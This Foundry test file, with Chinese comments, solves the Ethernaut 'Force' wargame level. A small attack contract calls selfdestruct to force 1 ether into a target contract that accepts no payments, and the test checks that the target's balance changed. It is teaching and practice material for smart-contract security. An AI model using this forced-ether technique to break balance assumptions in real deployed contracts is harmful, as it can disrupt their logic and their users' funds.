// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import "../../src/ethernaut/Force.sol"; 

// 攻击合约
contract ForceAttack {
    constructor() payable {}

    // 使用自毁将合约的余额强制发送到目标地址
    function attack(address payable _target) public {
        selfdestruct(_target);
    }
}

contract ForceTest is Test {
    Force public forceContract;
    ForceAttack public attackContract;

    function setUp() public {
        // 部署 Force 合约
        forceContract = new Force();
        // 部署攻击合约并为其提供初始 ETH 余额
        attackContract = new ForceAttack{value: 1 ether}();
    }

    function testForceSendEther() public {
        // 确保 Force 合约的初始余额为 0
        assertEq(address(forceContract).balance, 0);

        // 调用攻击合约的攻击函数，将其余额自毁发送到 Force 合约
        attackContract.attack(payable(address(forceContract)));

        // 检查 Force 合约是否成功接收到 ETH
        assertEq(address(forceContract).balance, 1 ether);
        console.log("balance:",address(forceContract).balance);
    }
}
